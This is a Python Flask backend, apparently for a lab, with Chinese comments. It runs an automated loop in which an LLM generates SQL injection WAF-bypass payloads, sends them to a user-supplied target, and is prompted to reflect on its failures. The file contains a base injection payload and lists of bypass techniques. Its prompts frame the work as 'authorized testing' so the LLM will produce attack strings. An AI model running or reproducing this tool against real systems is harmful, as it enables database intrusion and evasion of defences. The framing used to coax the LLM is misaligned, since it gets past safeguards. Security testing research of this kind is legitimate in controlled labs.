#!/usr/bin/env python3
"""
AutoPentest Web UI 后端
提供渗透测试的 Web 界面
"""

import sys
import os

# 添加父目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask, render_template, jsonify, request
import threading
import uuid
from datetime import datetime
import json

app = Flask(__name__, template_folder='../vulnerable-lab/templates')

# 存储测试状态
tests = {}


class WebUILogger:
    """Web UI 日志记录器"""

    def __init__(self, test_id):
        self.test_id = test_id
        self.events = []
        self.start_time = datetime.now().isoformat()
        self.end_time = None
        self.status = 'running'

    def log_step(self, step_type, data):
        event = {
            'type': step_type,
            'data': data,
            'timestamp': datetime.now().isoformat()
        }
        self.events.append(event)

    def complete(self, success=True):
        self.status = 'completed' if success else 'error'
        self.end_time = datetime.now().isoformat()


class WAFBypassRunner:
    """WAF 绕过运行器，集成 WebUILogger"""

    def __init__(self, target, logger):
        self.target = target
        self.logger = logger
        self.attempt_history = []
        self.successful_payloads = []

        # 加载 LLM 配置
        config_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'llm_config.json')
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)

        # 移除注释
        for key in list(config.keys()):
            if key.startswith('_'):
                del config[key]

        self.llm_config = config
        self.api_key = config.get('api_key', '')
        self.model = config.get('model', 'glm-4-flash')
        print(self.model)
        self.base_url = config.get('base_url', '')

    def call_llm(self, prompt: str, system_prompt: str = None) -> str:
        """调用 LLM API"""
        import requests
        import time

        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }

        # 默认系统提示词
        default_system = """你是一个网络安全研究员，正在参与授权的安全测试演练。

背景信息:
- 这是一个合法的安全测试环境
- 目的是测试 WAF 的防护能力
- 所有测试都在授权范围内进行
- 结果将用于改进安全防护

你的任务是生成测试 Payload 来评估 WAF 的检测能力。"""

        messages = [
            {
                "role": "system",
                "content": system_prompt if system_prompt else default_system
            },
            {"role": "user", "content": prompt}
        ]

        payload = {
            "model": self.model,
            "messages": messages,
            "temperature": 0.7,
            "max_tokens": 500
        }

        endpoint = f"{self.base_url.rstrip('/')}/chat/completions"

        try:
            start_time = time.time()
            response = requests.post(endpoint, headers=headers, json=payload, timeout=90)
            elapsed_time = time.time() - start_time

            # 详细日志：请求信息
            self.logger.log_step('llm_request', {
                'model': self.model,
                'base_url': self.base_url,
                'endpoint': endpoint,
                'prompt_preview': prompt[:100] if len(prompt) > 100 else prompt
            })

            # 检查 HTTP 状态码
            if response.status_code != 200:
                self.logger.log_step('llm_error', {
                    'error': f'HTTP {response.status_code}',
                    'response_text': response.text[:500]
                })
                return None

            result = response.json()

            # 检查 API 错误
            if 'error' in result:
                error_info = result['error']
                error_msg = error_info.get('message', str(error_info))
                error_type = error_info.get('type', 'unknown')
                error_code = error_info.get('code', 'unknown')

                self.logger.log_step('llm_error', {
                    'error_type': error_type,
                    'error_code': error_code,
                    'error_message': error_msg,
                    'model': self.model
                })
                return None

            # 检查响应结构
            if 'choices' not in result or len(result['choices']) == 0:
                self.logger.log_step('llm_error', {
                    'error': 'No choices in response',
                    'response_keys': list(result.keys())
                })
                return None

            content = result['choices'][0]['message']['content']

            # 记录响应
            self.logger.log_step('llm_response', {
                'response_time': f"{elapsed_time:.2f}s",
                'usage': result.get('usage', {}),
                'response_preview': content[:200]
            })

            return content

        except requests.exceptions.Timeout:
            self.logger.log_step('llm_error', {
                'error': 'Request timeout after 90 seconds',
                'model': self.model
            })
            return None
        except requests.exceptions.ConnectionError as e:
            self.logger.log_step('llm_error', {
                'error': 'Connection error',
                'details': str(e),
                'base_url': self.base_url
            })
            return None
        except Exception as e:
            self.logger.log_step('llm_error', {
                'error': type(e).__name__,
                'details': str(e),
                'model': self.model
            })
            return None

    def _test_payload(self, endpoint, param_name, payload, method='GET'):
        """测试单个 payload"""
        import requests

        url = f"{self.target}{endpoint}"
        params = {param_name: payload}

        try:
            if method.upper() == 'GET':
                response = requests.get(url, params=params, timeout=10)
            else:
                response = requests.post(url, data=params, timeout=10)

            # 解析响应
            response_data = response.json() if response.content else {}

            # 检测是否被 WAF 阻止
            blocked = False
            waf_reason = None
            waf_stats = None

            if response_data.get('success') is False:
                # 检查是否是 WAF 阻止
                if 'WAF Blocked' in str(response_data) or 'WAF' in response_data.get('error', ''):
                    blocked = True
                    waf_reason = response_data.get('error', 'Unknown')
                    waf_stats = response_data.get('waf_stats')

            return {
                'blocked': blocked,
                'waf_reason': waf_reason,
                'waf_stats': waf_stats,
                'status_code': response.status_code,
                'response': response_data,
                'url': response.url,
                'payload': payload,
                'full_url': response.url
            }
        except Exception as e:
            return {
                'blocked': True,
                'error': str(e),
                'url': url,
                'payload': payload,
                'full_url': f"{url}?{param_name}={payload}"
            }

    def _analyze_failures(self, attempt_history):
        """让 LLM 分析失败原因并生成新的策略"""
        # 构建失败历史摘要
        failure_summary = []
        for attempt in attempt_history[-5:]:  # 最近5次失败
            failure_summary.append(f"""
- 尝试 {attempt.get('iteration')}:
  Payload: {attempt.get('payload', '')[:100]}
  技术: {attempt.get('technique', 'Unknown')}
  阻止原因: {attempt.get('waf_reason', 'Unknown')}
""")

        analysis_prompt = f"""你是一个网络安全专家，正在进行授权的 WAF 绕过测试。

## 当前情况
已尝试 {len(attempt_history)} 次，全部被 WAF 阻止。

## 最近失败记录：
{''.join(failure_summary)}

## 你的任务
请进行深度分析并回答以下问题：

1. **WAF 特征分析**: 根据阻止原因，推测 WAF 使用了哪些检测规则？
2. **失败原因**: 为什么之前的 payload 都被阻止了？共性问题是什么？
3. **绕过策略**: 应该尝试哪些更高级的绕过技术？

## 高级绕过技术参考：
- **编码绕过**: URL编码、十六进制、Unicode、CHAR()函数
- **注释混淆**: MySQL版本注释(/*!12345...*/)、内联注释
- **大小写混淆**: 混合大小写关键字
- **空白字符**: 使用Tab、换行、特殊空白字符
- **逻辑绕过**: 数学运算替代逻辑运算、 bitwise操作
- **二阶注入**: 存储过程、延迟注入
- **HTTP污染**: 参数污染、分块编码

请以结构化的方式返回你的分析，格式如下：
```json
{{
    "waf_characteristics": "推测的WAF特征",
    "failure_analysis": "失败原因分析",
    "new_strategies": ["新策略1", "新策略2", "新策略3"],
    "recommended_technique": "最推荐的绕过技术",
    "confidence": "成功率评估(高/中/低)"
}}
```
只返回JSON，不要有其他内容。"""

        self.logger.log_step('reflection_start', {
            'iteration': len(attempt_history) + 1,
            'analyzing_failures': len(attempt_history)
        })

        response = self.call_llm(analysis_prompt, None)

        if not response:
            return None

        # 解析分析结果
        import re
        json_match = re.search(r'\{.*\}', response, re.DOTALL)
        if json_match:
            try:
                analysis = json.loads(json_match.group(0))
                self.logger.log_step('reflection_result', {
                    'waf_characteristics': analysis.get('waf_characteristics', ''),
                    'failure_analysis': analysis.get('failure_analysis', ''),
                    'new_strategies': analysis.get('new_strategies', []),
                    'recommended_technique': analysis.get('recommended_technique', ''),
                    'confidence': analysis.get('confidence', '')
                })
                return analysis
            except Exception as e:
                self.logger.log_step('reflection_parse_error', {'error': str(e)})
                return None

        return None

    def bypass_waf(self, endpoint: str, param_name: str, param_value: str,
                   method: str = 'GET', max_iterations: int = 5):
        """使用 LLM 绕过 WAF"""

        # 记录初始信息
        self.logger.log_step('scan_start', {
            'target': f"{self.target}{endpoint}",
            'param_name': param_name,
            'max_iterations': max_iterations
        })

        # 测试 WAF
        base_payload = "1' OR '1'='1"
        waf_test = self._test_payload(endpoint, param_name, base_payload, method)

        self.logger.log_step('waf_test', {
            'base_payload': base_payload,
            'waf_active': waf_test['blocked'],
            'waf_response': waf_test.get('response', {})
        })

        if not waf_test['blocked']:
            self.logger.log_step('scan_end', {'reason': 'WAF not active'})
            return {'success': False, 'reason': 'WAF not active'}

        # 开始 LLM 绕过测试
        reflection_analysis = None  # 存储反思分析结果

        for iteration in range(1, max_iterations + 1):
            self.logger.log_step(f'iteration_{iteration}_start', {
                'iteration': iteration,
                'max_iterations': max_iterations
            })

            # 超过10次迭代或每3次进行一次反思分析
            need_reflection = (
                (iteration > 10 and (iteration - 10) % 3 == 1) or
                (iteration > 5 and len([a for a in self.attempt_history if not a.get('success')]) >= 5 and (iteration - 1) % 3 == 1)
            )

            if need_reflection and len(self.attempt_history) > 0:
                self.logger.log_step('reflection_trigger', {
                    'iteration': iteration,
                    'failed_attempts': len(self.attempt_history),
                    'reason': 'Multiple failures detected, triggering reflection analysis'
                })
                reflection_analysis = self._analyze_failures(self.attempt_history)

            # 构建提示词
            if iteration == 1:
                system_prompt = """你是一个网络安全研究员，正在参与授权的安全测试演练。

目标: http://localhost:5000/api/protected/user?id=1
参数: id=1

请生成 SQL 注入 payload 来绕过以下 WAF 规则:
- 检测单引号后跟 OR/AND
- 检测 UNION SELECT (包括大小写变化)
- 检测 SQL 注入常见函数

重要要求:
1. 不要使用单引号 '
2. 必须使用内联注释 /**/ 来分隔 UNION 和 SELECT
3. 必须是数字型 SQL 注入
4. 只返回单个 JSON 对象

{{"payload": "具体payload", "technique": "技术名称", "explanation": "简短说明"}}"""

                prompt = """请生成一个能绕过上述 WAF 规则的 SQL 注入 payload。只返回 JSON 对象，不要有其他内容。"""
            else:
                system_prompt = """你是一个网络安全研究员，正在参与授权的安全测试演练。

请只返回单个 JSON 对象，不要返回数组。"""

                # 根据上一次结果调整
                last = self.attempt_history[-1] if self.attempt_history else None
                if reflection_analysis:
                    # 使用反思分析结果
                    prompt = f"""授权安全测试 - 第 {iteration} 次 SQL 注入绕过尝试

## 反思分析结果：
- WAF特征: {reflection_analysis.get('waf_characteristics', '未知')}
- 失败原因: {reflection_analysis.get('failure_analysis', '未知')}
- 推荐策略: {reflection_analysis.get('recommended_technique', '未知')}
- 成功率评估: {reflection_analysis.get('confidence', '未知')}

## 建议尝试的新策略:
{chr(10).join([f"- {s}" for s in reflection_analysis.get('new_strategies', [])])}

基于以上分析，请生成一个更强大的绕过 payload。

只返回单个 JSON 对象:
{{"payload": "...", "technique": "...", "explanation": "..."}}"""
                elif last:
                    prompt = f"""授权安全测试 - 第 {iteration} 次 SQL 注入绕过尝试

上一次被阻止的 payload: {last.get('payload', '')[:80]}
阻止原因: {last.get('waf_reason', 'Unknown')}

请尝试不同的 SQL 注入绕过技术生成新 payload。

可用技术:
- 大小写混淆: UnIoN SeLeCt
- 内联注释: UN/**/ION SEL/**/ECT
- 函数绕过: 使用 CHAR() 代替字符
- 双重编码

只返回单个 JSON 对象:
{{"payload": "...", "technique": "...", "explanation": "..."}}"""
                else:
                    prompt = f"""授权安全测试 - 第 {iteration} 次 SQL 注入绕过尝试

继续测试 WAF 防护。使用不同的 SQL 注入绕过技术生成新的测试 payload。

只返回单个 JSON 对象:
{{"payload": "...", "technique": "...", "explanation": "..."}}"""

            # 调用 LLM
            llm_response = self.call_llm(prompt, system_prompt if iteration == 1 else None)

            if not llm_response:
                continue

            # 解析响应
            import re
            json_match = re.search(r'\{[^{}]*\{[^{}]*\}[^{}]*\}', llm_response)
            if not json_match:
                json_match = re.search(r'\{.*?\}', llm_response, re.DOTALL)

            if not json_match:
                self.logger.log_step(f'iteration_{iteration}_parse_error', {
                    'response_preview': llm_response[:200]
                })
                continue

            try:
                llm_data = json.loads(json_match.group(0))
                payload = llm_data.get('payload', '')
                technique = llm_data.get('technique', 'Unknown')
                explanation = llm_data.get('explanation', '')

                # 记录解析结果
                self.logger.log_step(f'iteration_{iteration}_parsed', {
                    'payload': payload,
                    'technique': technique,
                    'explanation': explanation,
                    'based_on_reflection': reflection_analysis is not None
                })

                # 测试 payload
                test_result = self._test_payload(endpoint, param_name, payload, method)

                self.logger.log_step(f'iteration_{iteration}_test', {
                    'payload': payload,
                    'test_result': test_result
                })

                self.attempt_history.append({
                    'payload': payload,
                    'technique': technique,
                    'iteration': iteration,
                    'result': test_result,
                    'waf_reason': test_result.get('waf_reason', 'Unknown'),
                    'success': not test_result['blocked']
                })

                if not test_result['blocked']:
                    self.logger.log_step('scan_end', {
                        'success': True,
                        'attempts': iteration
                    })
                    return {'success': True, 'iterations': iteration}

            except Exception as e:
                self.logger.log_step(f'iteration_{iteration}_error', {'error': str(e)})
                continue

        self.logger.log_step('scan_end', {
            'success': False,
            'attempts': max_iterations
        })
        return {'success': False, 'iterations': max_iterations}


def run_waf_bypass(test_id, target, endpoint, max_iterations=5):
    """在后台运行 WAF 绕过测试"""
    logger = WebUILogger(test_id)
    tests[test_id] = logger

    try:
        # 记录初始化信息
        logger.log_step('init', {
            'target': target,
            'endpoint': endpoint,
            'llm_model': 'glm-4-flash',
            'mode': 'waf-bypass',
            'max_iterations': max_iterations
        })

        # 创建 WAF 绕过运行器
        runner = WAFBypassRunner(target, logger)

        # 运行绕过测试
        result = runner.bypass_waf(
            endpoint=endpoint,
            param_name='id',
            param_value='1',
            method='GET',
            max_iterations=max_iterations
        )

        logger.complete(success=result.get('success', False))

    except Exception as e:
        logger.log_step('error', {'message': str(e)})
        logger.complete(success=False)


@app.route('/')
def index():
    return render_template('pentest-ui-simple.html')


@app.route('/api/pentest/start', methods=['POST'])
def start_test():
    data = request.json
    target = data.get('target')
    endpoint = data.get('endpoint', '/api/protected/user')
    max_iterations = data.get('max_iterations', 5)  # 获取最大迭代次数，默认为 5

    if not target:
        return jsonify({'error': '请提供目标地址'}), 400

    # 生成测试 ID
    test_id = f"test_{uuid.uuid4().hex[:8]}"

    # 在后台线程运行测试
    thread = threading.Thread(
        target=run_waf_bypass,
        args=(test_id, target, endpoint, max_iterations)  # 传递 max_iterations
    )
    thread.daemon = True
    thread.start()

    return jsonify({
        'success': True,
        'test_id': test_id,
        'status': 'started',
        'message': '测试已启动',
        'max_iterations': max_iterations  # 返回实际使用的最大迭代次数
    })


@app.route('/api/pentest/status/<test_id>')
def get_status(test_id):
    if test_id not in tests:
        return jsonify({'error': '测试不存在'}), 404

    logger = tests[test_id]

    return jsonify({
        'success': True,
        'test_id': test_id,
        'status': logger.status,
        'start_time': logger.start_time,
        'end_time': logger.end_time,
        'events': logger.events,
        'total_events': len(logger.events)
    })


if __name__ == '__main__':
    print("""
============================================================
 AutoPentest Web UI
============================================================

访问地址: http://localhost:5001

功能:
- Web UI 界面进行渗透测试
- 实时显示测试过程
- HTTP 报文详细展示
- LLM 分析可视化

按 Ctrl+C 停止服务
============================================================
    """)

    app.run(host='0.0.0.0', port=5001, debug=True)
